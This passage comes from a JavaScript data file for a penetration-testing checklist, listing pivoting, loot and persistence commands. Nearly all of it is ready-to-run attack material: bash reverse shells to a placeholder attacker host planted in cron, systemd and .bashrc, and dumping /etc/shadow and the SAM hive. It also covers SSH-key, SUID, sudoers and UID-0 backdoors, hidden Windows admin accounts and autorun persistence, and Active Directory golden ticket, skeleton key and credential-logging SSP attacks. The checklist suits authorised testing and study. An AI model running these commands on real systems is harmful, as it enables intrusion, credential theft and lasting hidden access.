          }
        ]
      },
      {
        "id": "post-31",
        "name": "Pivoting: Chisel",
        "description": "HTTP-based tunneling tool. Single binary, works through firewalls. SOCKS5 proxy for full network pivoting.",
        "commands": [
          {
            "desc": "Reverse SOCKS proxy setup",
            "entries": [
              {
                "subdesc": "On attacker (server)",
                "cmd": [
                  "chisel server --reverse --socks5 -p 8000"
                ]
              },
              {
                "subdesc": "On target (client)",
                "cmd": [
                  "chisel client <LHOST>:8000 R:socks"
                ]
              },
              {
                "subdesc": "SOCKS5 proxy info",
                "cmd": [
                  "# Available on attacker at 127.0.0.1:1080",
                  "# Configure proxychains: socks5 127.0.0.1 1080"
                ]
              },
              {
                "subdesc": "Route traffic through proxy",
                "cmd": [
                  "proxychains nmap -sT -Pn <internal_target>"
                ]
              }
            ]
          },
          {
            "desc": "Port forward",
            "entries": [
              {
                "subdesc": "Forward specific port through chisel tunnel",
                "cmd": [
                  "# On attacker: chisel server --reverse -p 8000",
                  "# On target: chisel client <LHOST>:8000 R:8443:127.0.0.1:443",
                  "# Now attacker's 8443 → target's localhost:443"
                ]
              }
            ]
          },
          {
            "desc": "Browser proxy (FoxyProxy)",
            "entries": [
              {
                "subdesc": "Configure browser to use chisel SOCKS proxy for web apps",
                "cmd": [
                  "# FoxyProxy settings:",
                  "# Type: SOCKS5, IP: 127.0.0.1, Port: 1080"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-32",
        "name": "Pivoting: Ligolo-ng",
        "description": "Advanced tunneling with TUN interface — no SOCKS proxy needed, direct routing. Supports chained agents for multi-hop. Download from https://github.com/nicocha30/ligolo-ng/releases — get both proxy (attacker) and agent (target) binaries.",
        "commands": [
          {
            "desc": "Download Ligolo-ng",
            "entries": [
              {
                "subdesc": "Download proxy for your attacker OS and agent for the target OS from GitHub releases",
                "cmd": [
                  "# Download latest from: https://github.com/nicocha30/ligolo-ng/releases",
                  "# Attacker (Linux): ligolo-ng_proxy_*_linux_amd64.tar.gz",
                  "# Target (Windows): ligolo-ng_agent_*_windows_amd64.zip",
                  "# Target (Linux): ligolo-ng_agent_*_linux_amd64.tar.gz"
                ]
              }
            ]
          },
          {
            "desc": "Basic tunnel setup",
            "entries": [
              {
                "subdesc": "On attacker — create TUN interface",
                "cmd": [
                  "sudo ip tuntap add user $(whoami) mode tun ligolo",
                  "sudo ip link set ligolo up"
                ]
              },
              {
                "subdesc": "Start proxy",
                "cmd": [
                  "ligolo-proxy -selfcert -laddr 0.0.0.0:11601"
                ]
              },
              {
                "subdesc": "On target — connect agent",
                "cmd": [
                  "ligolo-agent -connect <LHOST>:11601 -ignore-cert"
                ]
              }
            ]
          },
          {
            "desc": "Route internal network",
            "entries": [
              {
                "subdesc": "In ligolo proxy console",
                "cmd": [
                  ">> session → select agent session",
                  ">> ifconfig → see target's interfaces"
                ]
              },
              {
                "subdesc": "On attacker (new terminal)",
                "cmd": [
                  "sudo ip route add <internal_subnet>/24 dev ligolo"
                ]
              },
              {
                "subdesc": "In ligolo console — activate tunnel",
                "cmd": [
                  ">> start → activate tunnel"
                ]
              },
              {
                "subdesc": "Access internal network",
                "cmd": [
                  "# Now access internal network directly: nmap <internal_ip>"
                ]
              }
            ]
          },
          {
            "desc": "Listeners (back-traffic)",
            "entries": [
              {
                "subdesc": "In ligolo session — add listener",
                "cmd": [
                  ">> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234 --tcp"
                ]
              },
              {
                "subdesc": "Usage",
                "cmd": [
                  "# Traffic hitting pivot:1234 → forwarded to attacker:1234",
                  "# Use for reverse shells: set LHOST=<pivot_ip> LPORT=1234"
                ]
              }
            ]
          },
          {
            "desc": "Deeper network (multi-hop)",
            "entries": [
              {
                "subdesc": "Create second TUN interface",
                "cmd": [
                  "sudo ip tuntap add user $(whoami) mode tun ligolo2",
                  "sudo ip link set ligolo2 up"
                ]
              },
              {
                "subdesc": "Add listener on first pivot for second agent",
                "cmd": [
                  ">> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp"
                ]
              },
              {
                "subdesc": "Run agent on second pivot",
                "cmd": [
                  "# Agent on second pivot connects through first pivot"
                ]
              },
              {
                "subdesc": "Add route for deeper subnet",
                "cmd": [
                  "sudo ip route add <deeper_subnet>/24 dev ligolo2"
                ]
              }
            ]
          },
          {
            "desc": "Revert / cleanup",
            "entries": [
              {
                "subdesc": "Remove routes and TUN interfaces after engagement",
                "cmd": [
                  "sudo ip route del <internal_subnet>/24 dev ligolo",
                  "sudo ip link set ligolo down",
                  "sudo ip tuntap del mode tun ligolo"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-33",
        "name": "Pivoting: Other Tools",
        "description": "Additional pivoting tools — socat, sshuttle, plink, netsh. Choose based on OS and available tools on target.",
        "commands": [
          {
            "desc": "Socat",
            "entries": [
              {
                "subdesc": "Port forward — relay traffic",
                "cmd": [
                  "socat TCP-LISTEN:<LPORT>,fork TCP:<target_ip>:<target_port>"
                ]
              },
              {
                "subdesc": "Encrypted tunnel",
                "cmd": [
                  "socat OPENSSL-LISTEN:<LPORT>,cert=cert.pem,verify=0,fork TCP:<target_ip>:<target_port>"
                ]
              }
            ]
          },
          {
            "desc": "Sshuttle",
            "entries": [
              {
                "subdesc": "Basic tunnel",
                "cmd": [
                  "sshuttle -r user@<pivot_host> <internal_subnet>/24"
                ]
              },
              {
                "subdesc": "With SSH key",
                "cmd": [
                  "sshuttle -r user@<pivot_host> <internal_subnet>/24 --ssh-cmd 'ssh -i key.pem'"
                ]
              },
              {
                "subdesc": "Exclude attacker subnet",
                "cmd": [
                  "sshuttle -r user@<pivot_host> <internal_subnet>/24 -x <attacker_subnet>/24"
                ]
              }
            ]
          },
          {
            "desc": "Plink (Windows SSH)",
            "entries": [
              {
                "subdesc": "Remote port forward",
                "cmd": [
                  "plink.exe -ssh -l <user> -pw <pass> -R <RPORT>:127.0.0.1:<LPORT> <attacker_ip>"
                ]
              },
              {
                "subdesc": "Dynamic forward",
                "cmd": [
                  "plink.exe -ssh -l <user> -pw <pass> -D 1080 <attacker_ip>"
                ]
              }
            ]
          },
          {
            "desc": "netsh (Windows built-in)",
            "entries": [
              {
                "subdesc": "Add port forward",
                "cmd": [
                  "netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<target_port> connectaddress=<target_ip>"
                ]
              },
              {
                "subdesc": "Verify",
                "cmd": [
                  "netsh interface portproxy show all"
                ]
              },
              {
                "subdesc": "Remove",
                "cmd": [
                  "netsh interface portproxy delete v4tov4 listenport=<LPORT> listenaddress=0.0.0.0"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-34",
        "name": "Loot: Flags & Sensitive Files",
        "description": "Collect proof files, flags, credentials, and sensitive data for documentation and reporting.",
        "commands": [
          {
            "desc": "Linux flags & secrets",
            "entries": [
              {
                "subdesc": "Common flag locations and sensitive files",
                "cmd": [
                  "find / -name 'proof.txt' -o -name 'local.txt' -o -name 'flag.txt' -o -name 'root.txt' -o -name 'user.txt' 2>/dev/null",
                  "cat /root/proof.txt 2>/dev/null",
                  "cat /home/*/local.txt 2>/dev/null",
                  "cat /etc/shadow",
                  "find / -name '*.kdbx' -o -name '*.key' -o -name '*.pfx' 2>/dev/null"
                ]
              }
            ]
          },
          {
            "desc": "Windows flags & secrets",
            "entries": [
              {
                "subdesc": "Common flag locations and sensitive files",
                "cmd": [
                  "type C:\\Users\\Administrator\\Desktop\\proof.txt",
                  "type C:\\Users\\*\\Desktop\\local.txt",
                  "dir /s /b C:\\Users\\*\\*.txt C:\\Users\\*\\*.kdbx C:\\Users\\*\\*.key 2>nul",
                  "reg save hklm\\sam C:\\Temp\\sam.save",
                  "reg save hklm\\system C:\\Temp\\system.save"
                ]
              }
            ]
          }
        ]
      }
    ]
  },

  /* ─── Phase 6: Persistence ────────────────────────────── */
  {
    "id": "persistence",
    "name": "Persistence",
    "optional": true,
    "items": [
      {
        "id": "persist-1",
        "name": "Linux: SSH Key Persistence",
        "description": "Add attacker SSH key to authorized_keys for persistent passwordless access.",
        "commands": [
          {
            "desc": "Generate and plant SSH key",
            "entries": [
              {
                "subdesc": "On attacker — generate key pair",
                "cmd": [
                  "ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key -N ''"
                ]
              },
              {
                "subdesc": "On target — add public key",
                "cmd": [
                  "mkdir -p /root/.ssh",
                  "echo '<contents of backdoor_key.pub>' >> /root/.ssh/authorized_keys",
                  "chmod 600 /root/.ssh/authorized_keys"
                ]
              },
              {
                "subdesc": "Connect",
                "cmd": [
                  "ssh -i /tmp/backdoor_key root@<TARGET>"
                ]
              }
            ]
          },
          {
            "desc": "Multiple user persistence",
            "entries": [
              {
                "subdesc": "Plant keys in all user home directories",
                "cmd": [
                  "for user in $(ls /home); do mkdir -p /home/$user/.ssh; echo '<pubkey>' >> /home/$user/.ssh/authorized_keys; done"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-2",
        "name": "Linux: Cron Job Backdoor",
        "description": "Create recurring reverse shell callback via cron job. Survives reboots.",
        "commands": [
          {
            "desc": "User crontab backdoor",
            "entries": [
              {
                "subdesc": "Reverse shell every minute",
                "cmd": [
                  "(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"') | crontab -"
                ]
              }
            ]
          },
          {
            "desc": "System crontab backdoor",
            "entries": [
              {
                "subdesc": "Add to /etc/crontab",
                "cmd": [
                  "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"' >> /etc/crontab"
                ]
              },
              {
                "subdesc": "Alternatively, drop script in cron.d",
                "cmd": [
                  "echo '* * * * * root /tmp/.backdoor.sh' > /etc/cron.d/sysupdate"
                ]
              }
            ]
          },
          {
            "desc": "Verify persistence",
            "entries": [
              {
                "subdesc": "Confirm cron jobs are active and will survive reboot",
                "cmd": [
                  "crontab -l",
                  "cat /etc/crontab",
                  "ls -la /etc/cron.d/"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-3",
        "name": "Linux: SUID Backdoor",
        "description": "Create SUID copy of bash or custom binary for instant root escalation.",
        "commands": [
          {
            "desc": "SUID bash copy",
            "entries": [
              {
                "subdesc": "Create SUID copy",
                "cmd": [
                  "cp /bin/bash /tmp/.hidden_shell",
                  "chmod u+s /tmp/.hidden_shell"
                ]
              },
              {
                "subdesc": "Trigger",
                "cmd": [
                  "/tmp/.hidden_shell -p"
                ]
              }
            ]
          },
          {
            "desc": "Hidden SUID in legitimate directory",
            "entries": [
              {
                "subdesc": "Create hidden SUID binary",
                "cmd": [
                  "cp /bin/bash /usr/local/bin/.update-helper",
                  "chmod 4755 /usr/local/bin/.update-helper"
                ]
              },
              {
                "subdesc": "Trigger",
                "cmd": [
                  "/usr/local/bin/.update-helper -p"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-4",
        "name": "Linux: Systemd Service Backdoor",
        "description": "Create a systemd service that starts on boot and maintains persistent callback.",
        "commands": [
          {
            "desc": "Create malicious service",
            "entries": [
              {
                "subdesc": "Create service file",
                "cmd": [
                  "cat > /etc/systemd/system/sysupdate.service << 'EOF'\n[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\nEOF"
                ]
              },
              {
                "subdesc": "Enable and start",
                "cmd": [
                  "systemctl daemon-reload",
                  "systemctl enable sysupdate.service",
                  "systemctl start sysupdate.service"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-5",
        "name": "Linux: Bashrc/Profile Backdoor",
        "description": "Inject commands into shell initialization files — executes every time user logs in or opens terminal.",
        "commands": [
          {
            "desc": ".bashrc backdoor",
            "entries": [
              {
                "subdesc": "Triggers on every new bash session",
                "cmd": [
                  "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 &' >> /root/.bashrc",
                  "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 &' >> /home/<user>/.bashrc"
                ]
              }
            ]
          },
          {
            "desc": ".profile / .bash_profile backdoor",
            "entries": [
              {
                "subdesc": "Triggers on login shells only",
                "cmd": [
                  "echo 'nohup bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\" &' >> /root/.profile"
                ]
              }
            ]
          },
          {
            "desc": "Add user to sudoers",
            "entries": [
              {
                "subdesc": "Direct append",
                "cmd": [
                  "echo '<username> ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
                ]
              },
              {
                "subdesc": "Via sudoers.d",
                "cmd": [
                  "echo '<username> ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/<username>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-6",
        "name": "Linux: PAM & Login Backdoor",
        "description": "Backdoor PAM for universal password acceptance or inject into login mechanisms.",
        "commands": [
          {
            "desc": "PAM backdoor (advanced)",
            "entries": [
              {
                "subdesc": "Modify PAM module to accept a hardcoded password for any user",
                "cmd": [
                  "# Modify pam_unix.so source to accept backdoor password",
                  "# Compile modified pam_unix.so and replace original",
                  "# Backup original: cp /lib/x86_64-linux-gnu/security/pam_unix.so /tmp/.pam_unix.so.bak"
                ]
              }
            ]
          },
          {
            "desc": "Add root user to /etc/passwd",
            "entries": [
              {
                "subdesc": "Create new user with UID 0 (root)",
                "cmd": [
                  "openssl passwd -1 -salt xyz password123",
                  "echo 'backdoor:$1$xyz$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-7",
        "name": "Windows: Registry Run Key",
        "description": "Add registry autorun entry — payload executes every time the user logs in.",
        "commands": [
          {
            "desc": "Current user (HKCU)",
            "entries": [
              {
                "subdesc": "Registry (reg add)",
                "cmd": [
                  "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\" /f"
                ]
              },
              {
                "subdesc": "PowerShell alternative",
                "cmd": [
                  "Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value 'C:\\Temp\\shell.exe'"
                ]
              }
            ]
          },
          {
            "desc": "All users (HKLM)",
            "entries": [
              {
                "subdesc": "Requires admin — runs for any user logon",
                "cmd": [
                  "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\" /f"
                ]
              }
            ]
          },
          {
            "desc": "Other autorun locations",
            "entries": [
              {
                "subdesc": "Less monitored registry keys",
                "cmd": [
                  "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\" /f",
                  "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,C:\\Temp\\shell.exe\" /f"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-8",
        "name": "Windows: Scheduled Task Persistence",
        "description": "Create scheduled task for recurring payload execution. Runs as SYSTEM if admin.",
        "commands": [
          {
            "desc": "SYSTEM scheduled task",
            "entries": [
              {
                "subdesc": "Runs every 5 minutes as SYSTEM",
                "cmd": [
                  "schtasks /create /tn \"SystemUpdate\" /tr \"C:\\Temp\\shell.exe\" /sc minute /mo 5 /ru SYSTEM /f"
                ]
              },
              {
                "subdesc": "On logon trigger",
                "cmd": [
                  "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Temp\\shell.exe\" /sc onlogon /ru SYSTEM /f"
                ]
              }
            ]
          },
          {
            "desc": "User-level scheduled task",
            "entries": [
              {
                "subdesc": "Basic (schtasks)",
                "cmd": [
                  "schtasks /create /tn \"Updater\" /tr \"C:\\Temp\\shell.exe\" /sc minute /mo 5 /f"
                ]
              },
              {
                "subdesc": "PowerShell",
                "cmd": [
                  "$action = New-ScheduledTaskAction -Execute 'C:\\Temp\\shell.exe'",
                  "$trigger = New-ScheduledTaskTrigger -AtLogon",
                  "Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'Updater' -Description 'System Update'"
                ]
              }
            ]
          },
          {
            "desc": "Verify",
            "entries": [
              {
                "subdesc": "Confirm scheduled task is registered and running on schedule",
                "cmd": [
                  "schtasks /query /tn \"SystemUpdate\" /fo LIST /v"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-9",
        "name": "Windows: New Admin User",
        "description": "Create persistent privileged local account. Quick but noisy — easily detected.",
        "commands": [
          {
            "desc": "Create local admin",
            "entries": [
              {
                "subdesc": "Add user and grant admin + RDP",
                "cmd": [
                  "net user hacker Password123! /add",
                  "net localgroup Administrators hacker /add",
                  "net localgroup \"Remote Desktop Users\" hacker /add"
                ]
              }
            ]
          },
          {
            "desc": "Hide user from login screen",
            "entries": [
              {
                "subdesc": "Prevent user from showing on Windows login UI",
                "cmd": [
                  "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hacker /t REG_DWORD /d 0 /f"
                ]
              }
            ]
          },
          {
            "desc": "Enable RDP (if disabled)",
            "entries": [
              {
                "subdesc": "Enable Remote Desktop and allow through firewall",
                "cmd": [
                  "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
                  "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-10",
        "name": "Windows: Service Creation",
        "description": "Create a Windows service that runs payload as SYSTEM on boot.",
        "commands": [
          {
            "desc": "Create persistent service",
            "entries": [
              {
                "subdesc": "Create and start",
                "cmd": [
                  "sc create SysUpdate binpath= \"C:\\Temp\\shell.exe\" start= auto obj= LocalSystem",
                  "sc start SysUpdate"
                ]
              },
              {
                "subdesc": "Add description to blend in",
                "cmd": [
                  "sc description SysUpdate \"Windows System Update Service\""
                ]
              }
            ]
          },
          {
            "desc": "Modify existing service",
            "entries": [
              {
                "subdesc": "Hijack a disabled/stopped service binary path",
                "cmd": [
                  "sc config <stopped_service> binpath= \"C:\\Temp\\shell.exe\"",
                  "sc config <stopped_service> start= auto",
                  "sc start <stopped_service>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-11",
        "name": "Windows: WMI Event Subscription",
        "description": "Fileless persistence using WMI event triggers. Survives reboots, hard to detect.",
        "commands": [
          {
            "desc": "WMI event subscription",
            "entries": [
              {
                "subdesc": "Create WMI event filter (triggers on boot)",
                "cmd": [
                  "$filterArgs = @{name='Updater'; EventNameSpace='root\\CimV2'; QueryLanguage='WQL'; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}",
                  "$filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments $filterArgs"
                ]
              },
              {
                "subdesc": "Create consumer (action)",
                "cmd": [
                  "$consumerArgs = @{name='Updater'; CommandLineTemplate='C:\\Temp\\shell.exe'}",
                  "$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments $consumerArgs"
                ]
              },
              {
                "subdesc": "Bind filter to consumer",
                "cmd": [
                  "$bindingArgs = @{Filter=$filter; Consumer=$consumer}",
                  "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments $bindingArgs"
                ]
              }
            ]
          },
          {
            "desc": "Detect / cleanup WMI persistence",
            "entries": [
              {
                "subdesc": "Enumerate WMI event subscriptions to verify or remove persistence",
                "cmd": [
                  "Get-WmiObject -Namespace root\\subscription -Class __EventFilter",
                  "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer",
                  "Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-12",
        "name": "Windows: Startup Folder",
        "description": "Drop payload in Startup folder — executes on user logon. Simple but effective.",
        "commands": [
          {
            "desc": "Current user startup",
            "entries": [
              {
                "subdesc": "Only runs when specific user logs in",
                "cmd": [
                  "copy C:\\Temp\\shell.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe\""
                ]
              }
            ]
          },
          {
            "desc": "All users startup",
            "entries": [
              {
                "subdesc": "Requires admin — runs for any user logon",
                "cmd": [
                  "copy C:\\Temp\\shell.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\updater.exe\""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-13",
        "name": "AD: Golden Ticket",
        "description": "Forge TGT with krbtgt hash — complete domain access that survives password resets (except krbtgt reset).",
        "commands": [
          {
            "desc": "Extract krbtgt hash",
            "entries": [
              {
                "subdesc": "DCSync for krbtgt",
                "cmd": [
                  "mimikatz # lsadump::dcsync /user:krbtgt",
                  "secretsdump.py <domain>/<admin>:<pass>@<dc_ip> -just-dc-user krbtgt"
                ]
              }
            ]
          },
          {
            "desc": "Forge golden ticket",
            "entries": [
              {
                "subdesc": "With mimikatz",
                "cmd": [
                  "mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt"
                ]
              },
              {
                "subdesc": "With impacket",
                "cmd": [
                  "ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain <domain> Administrator",
                  "export KRB5CCNAME=Administrator.ccache",
                  "psexec.py <domain>/Administrator@<dc> -k -no-pass"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-14",
        "name": "AD: Silver Ticket",
        "description": "Forge TGS for specific service using service account hash — more targeted and stealthy than golden ticket.",
        "commands": [
          {
            "desc": "Forge silver ticket",
            "entries": [
              {
                "subdesc": "Target specific service",
                "cmd": [
                  "mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<target_server> /service:cifs /rc4:<service_account_hash> /ptt"
                ]
              },
              {
                "subdesc": "Common service SPNs",
                "cmd": [
                  "# cifs (SMB), http (web), mssql, ldap, host"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-15",
        "name": "AD: Diamond & Sapphire Tickets",
        "description": "Modern ticket attacks that modify legitimate TGTs — harder to detect than golden tickets.",
        "commands": [
          {
            "desc": "Diamond ticket (Rubeus)",
            "entries": [
              {
                "subdesc": "Modify real TGT instead of forging from scratch — evades golden ticket detections",
                "cmd": [
                  "Rubeus.exe diamond /krbkey:<aes256_krbtgt_key> /user:<user> /password:<pass> /enctype:aes /domain:<domain> /dc:<dc> /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt"
                ]
              }
            ]
          },
          {
            "desc": "Sapphire ticket (Rubeus)",
            "entries": [
              {
                "subdesc": "Uses S4U2self + U2U to get legitimate PAC — most stealthy Kerberos persistence",
                "cmd": [
                  "Rubeus.exe diamond /krbkey:<aes256_krbtgt_key> /user:<user> /password:<pass> /enctype:aes /domain:<domain> /dc:<dc> /ticketuser:Administrator /ticketuserid:500 /groups:512 /tgtdeleg /ptt"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-16",
        "name": "AD: DSRM & Skeleton Key",
        "description": "Domain Controller persistence mechanisms — DSRM password abuse and in-memory skeleton key.",
        "commands": [
          {
            "desc": "DSRM persistence",
            "entries": [
              {
                "subdesc": "Dump DSRM password (on DC)",
                "cmd": [
                  "mimikatz # token::elevate",
                  "mimikatz # lsadump::sam"
                ]
              },
              {
                "subdesc": "Enable network DSRM logon",
                "cmd": [
                  "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f"
                ]
              },
              {
                "subdesc": "Login with DSRM creds",
                "cmd": [
                  "# Use Administrator hash with /domain:dc-hostname"
                ]
              }
            ]
          },
          {
            "desc": "Skeleton key",
            "entries": [
              {
                "subdesc": "Patch LSASS in memory",
                "cmd": [
                  "mimikatz # privilege::debug",
                  "mimikatz # misc::skeleton"
                ]
              },
              {
                "subdesc": "Login as any user",
                "cmd": [
                  "# Password for any account: mimikatz (lost on reboot)"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-17",
        "name": "AD: Golden Certificate & Custom SSP",
        "description": "ADCS certificate persistence and custom Security Support Provider for credential harvesting.",
        "commands": [
          {
            "desc": "Golden certificate",
            "entries": [
              {
                "subdesc": "Extract CA certificate & key",
                "cmd": [
                  "certipy ca -ca '<ca_name>' -backup -u <admin>@<domain> -p <pass> -dc-ip <dc_ip>"
                ]
              },
              {
                "subdesc": "Forge certificate for Administrator",
                "cmd": [
                  "certipy forge -ca-pfx ca.pfx -upn Administrator@<domain> -subject 'CN=Administrator'"
                ]
              },
              {
                "subdesc": "Authenticate with forged cert",
                "cmd": [
                  "certipy auth -pfx administrator_forged.pfx -dc-ip <dc_ip>"
                ]
              }
            ]
          },
          {
            "desc": "Custom SSP",
            "entries": [
              {
                "subdesc": "Copy mimilib.dll to System32",
                "cmd": [
                  "# Copy mimilib.dll to C:\\Windows\\System32"
                ]
              },
              {
                "subdesc": "Register SSP",
                "cmd": [
                  "mimikatz # misc::memssp"
                ]
              },
              {
                "subdesc": "Credentials logged to",
                "cmd": [
                  "# C:\\Windows\\System32\\kiwissp.log"
                ]
              },
              {
                "subdesc": "Persistent across reboots (registry)",
                "cmd": [
                  "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Security Packages\" /t REG_MULTI_SZ /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /f"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "persist-18",
        "name": "AD: AdminSDHolder & SID History",
        "description": "Stealthy AD persistence via protected object abuse and SID history injection.",
        "commands": [
          {
            "desc": "AdminSDHolder abuse",
            "entries": [
              {
                "subdesc": "Grant user Full Control on AdminSDHolder",
                "cmd": [
                  "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>' -PrincipalIdentity <user> -Rights All -Verbose"
                ]
              },
              {
                "subdesc": "After SDProp runs (~60 min)",
                "cmd": [
                  "# User has Full Control on Domain Admins, Enterprise Admins, etc.",
                  "# Force SDProp: Invoke-SDPropagator -ShowProgress"
                ]
              }
            ]
          },
          {
            "desc": "SID History injection",
            "entries": [
              {
                "subdesc": "Add DA SID with mimikatz",
                "cmd": [
                  "mimikatz # sid::patch",
                  "mimikatz # sid::add /sam:<target_user> /new:<domain_admin_sid>"
                ]
              },
              {
                "subdesc": "Alternatively with PowerView",
                "cmd": [
                  "Set-DomainObject -Identity <user> -Set @{'SIDHistory'='<DA_SID>'}"
                ]
              }
            ]
          }
        ]
      }
    ]
  }
];

/* Normalise all command arrays into strings on load */
normalizeChecklistPhases(checklistPhases);
